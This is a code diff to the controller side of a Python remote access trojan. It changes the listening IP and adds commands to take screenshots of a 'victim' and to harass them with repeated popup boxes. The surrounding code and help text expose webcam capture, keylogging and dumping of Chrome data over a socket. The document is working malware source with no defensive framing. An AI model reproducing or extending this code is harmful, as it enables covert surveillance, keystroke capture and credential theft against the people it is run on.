@@ -1,7 +1,7 @@
 import socket, os, time, argparse
 import cv2, socket, numpy
  
-ip_address = '192.168.10.12'
+ip_address = '192.168.10.15'
 
 banner ="""                                                  
    (                    *   )               (    (   
@@ -36,7 +36,16 @@ def functions():
     print 'screencap       --> Get a screen shot of the victim\'s desktop'
     print 'startLogger     --> Start keylogger'
     print 'stopLogger      --> Stop keylogger'
-    print 'terminate       --> Stop Trolling\n'
+    print 'terminate       --> Stop Trolling'
+    print '\ntroll--<Troll message>--<buttonCode+iconCode>--<Popup title>--<# of popus> --> Troll victim with pop ups\n'
+    print """button Codes                  -                 Icon Codes
+0: Normal message box                   16: Critical message icon
+1: OK and Cancel                        32: Warning query icon
+2: Abort, Retry, Ignore                 48: Warning message icon 
+3: Yes, No, Cancel                      64: Information message icon
+4: Yes and No	                        4096: Always on top of the desktop
+5: Retry and Cancel
+    """
                                                  
 def webCam(connection, command):
     connection.send(command)
@@ -110,6 +119,17 @@ def transferChromeDump(conn,command):
             break
         f.write(bits)
 
+def snapshot(conn,command):
+    conn.send(command)
+    f = open('snapshot.png','wb')
+    while True:  
+        bits = conn.recv(1024)
+        if bits.endswith('snapSent'):
+            print '\n[+] Snap Taken '
+            f.close()
+            break
+        f.write(bits)
+
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((ip_address, 8080))
@@ -141,6 +161,14 @@ def connect():
         elif 'send' in command:
             image = command.split(' ')
             transferImage(conn, image[1], command)
+        elif 'snapshot' in command:
+            snapshot(conn, command)
+        elif 'troll' in command:
+            try:
+                call, msg, icons, title, times = command.split('--')
+                conn.send(command) 
+            except:
+                print 'Usage troll--<Troll message>--<buttonCode+iconCode>--<Popup title>--<# of popus>\neg. troll--"You\'ve been p0wned"--0+16+4096--"trolled"--120\ntype \'CoN-mE\' for more information'
         else:
             conn.send(command) 
             print conn.recv(1024) 
